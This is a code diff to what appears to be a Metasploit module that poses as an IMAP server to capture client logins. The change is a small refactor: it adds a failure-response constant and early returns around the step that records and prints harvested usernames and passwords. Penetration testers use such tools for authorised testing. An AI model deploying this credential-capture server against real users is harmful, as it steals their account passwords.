@@ -7,6 +7,8 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
+  LOGIN_FAILURE_RESPONSE = 'NO LOGIN FAILURE'.freeze
+
   def initialize
     super(
       'Name' => 'Authentication Capture: IMAP',
@@ -91,6 +93,7 @@ class MetasploitModule < Msf::Auxiliary
             'QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 ' \
             "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
       client.put "#{num} OK CAPABILITY completed.\r\n"
+      return
     end
 
     # Handle attempt to authenticate using Yahoo's magic cookie
@@ -111,6 +114,7 @@ class MetasploitModule < Msf::Auxiliary
       register_creds(@state[client][:ip], @state[client][:user], @state[client][:pass], 'imap')
       print_good("IMAP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
 
+      client.put "#{num} #{LOGIN_FAILURE_RESPONSE}\r\n"
       return
     end
 
@@ -128,7 +132,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     @state[client][:pass] = data.strip
-    client.put "#{num} NO LOGIN FAILURE\r\n"
+    client.put "#{num} #{LOGIN_FAILURE_RESPONSE}\r\n"
     return
   end
 
